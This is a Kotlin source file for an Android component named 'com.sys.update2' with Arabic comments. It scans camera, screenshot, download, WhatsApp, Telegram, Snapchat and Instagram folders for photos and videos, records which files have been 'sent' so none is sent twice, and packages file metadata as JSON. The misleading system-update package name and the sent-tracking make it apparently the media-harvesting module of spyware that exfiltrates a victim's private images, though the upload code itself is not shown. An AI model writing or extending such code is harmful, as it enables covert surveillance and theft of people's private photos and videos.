package com.sys.update2

import android.content.Context
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object MediaScanner {

    private const val MAX_FILE_MB = 500L
    private const val PREFS_NAME  = "media_scanner_prefs"
    private const val KEY_SENT    = "sent_files"

    private fun fmt(t: Long) =
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date(t))

    data class MediaFile(
        val path: String,
        val name: String,
        val size: Long,
        val lastModified: Long,
        val mime: String
    )

    // ==================== الفحص ====================

    fun scanImages(): List<MediaFile> =
        scanByExtension(
            listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic", "heif", "tiff", "raw")
        ).sortedByDescending { it.lastModified }

    fun scanVideos(): List<MediaFile> =
        scanByExtension(
            listOf("mp4", "mkv", "avi", "mov", "3gp", "webm", "flv", "wmv", "m4v")
        ).sortedByDescending { it.lastModified }

    // ==================== منع التكرار ====================

    /** هل هذا الملف أُرسل سابقًا؟ */
    fun isSent(context: Context, mf: MediaFile): Boolean {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(KEY_SENT, emptySet())!!.contains(key(mf))
    }

    /** سجّل الملف كـ "تم الإرسال" */
    fun markSent(context: Context, mf: MediaFile) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val sent  = prefs.getStringSet(KEY_SENT, emptySet())!!.toMutableSet()
        sent += key(mf)
        prefs.edit().putStringSet(KEY_SENT, sent).apply()
    }

    /** مفتاح فريد لكل ملف = المسار + الحجم + وقت التعديل */
    private fun key(mf: MediaFile): String =
        "${mf.path}|${mf.size}|${mf.lastModified}"

    /** مسح السجل بالكامل (اختياري) */
    fun reset(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_SENT).apply()
    }

    // ==================== المسح الداخلي ====================

    private fun scanByExtension(extensions: List<String>): List<MediaFile> {
        val result = mutableListOf<MediaFile>()
        val roots = listOf(
            File("/storage/emulated/0/DCIM/Camera"),
            File("/storage/emulated/0/DCIM/Screenshots"),
            File("/storage/emulated/0/Pictures/Screenshots"),
            File("/storage/emulated/0/Pictures/Camera"),
            File("/storage/emulated/0/DCIM"),
            File("/storage/emulated/0/Pictures"),
            File("/storage/emulated/0/Download"),
            File("/storage/emulated/0/Documents"),
            File("/storage/emulated/0/Movies"),
            File("/storage/emulated/0/WhatsApp/Media"),
            File("/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"),
            File("/storage/emulated/0/Telegram"),
            File("/storage/emulated/0/Android/media/org.telegram.messenger"),
            File("/storage/emulated/0/Snapchat"),
            File("/storage/emulated/0/Instagram"),
            File("/storage/emulated/0/Android/media/com.instagram.android"),
        )
        for (root in roots) {
            walk(root, extensions, result, depth = 0, maxDepth = 12, limit = 20000)
        }
        return result.distinctBy { it.path }
    }

    private fun walk(
        dir: File?,
        extensions: List<String>,
        out: MutableList<MediaFile>,
        depth: Int,
        maxDepth: Int,
        limit: Int
    ) {
        if (dir == null || !dir.exists() || !dir.isDirectory) return
        if (depth > maxDepth || out.size >= limit) return

        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return
        for (f in children) {
            if (out.size >= limit) return
            try {
                if (f.isDirectory) {
                    if (f.name.startsWith(".")) continue
                    walk(f, extensions, out, depth + 1, maxDepth, limit)
                } else {
                    val ext = f.extension.lowercase(Locale.US)
                    if (ext in extensions) {
                        val sizeMb = f.length() / (1024 * 1024)
                        if (sizeMb in 0..MAX_FILE_MB) {
                            out += MediaFile(
                                path = f.absolutePath,
                                name = f.name,
                                size = f.length(),
                                lastModified = f.lastModified(),
                                mime = guessMime(ext)
                            )
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun guessMime(ext: String): String = when (ext) {
        "jpg", "jpeg"  -> "image/jpeg"
        "png"          -> "image/png"
        "gif"          -> "image/gif"
        "webp"         -> "image/webp"
        "bmp"          -> "image/bmp"
        "heic", "heif" -> "image/heic"
        "tiff", "tif"  -> "image/tiff"
        "raw"          -> "image/x-raw"
        "mp4", "m4v"   -> "video/mp4"
        "mkv"          -> "video/x-matroska"
        "avi"          -> "video/x-msvideo"
        "mov"          -> "video/quicktime"
        "3gp"          -> "video/3gpp"
        "webm"         -> "video/webm"
        "flv"          -> "video/x-flv"
        "wmv"          -> "video/x-ms-wmv"
        else           -> "application/octet-stream"
    }

    fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
        put("type", "media")
        put("path", mf.path)
        put("name", mf.name)
        put("size", mf.size)
        put("modified", fmt(mf.lastModified))
        put("mime", mf.mime)
    }
}
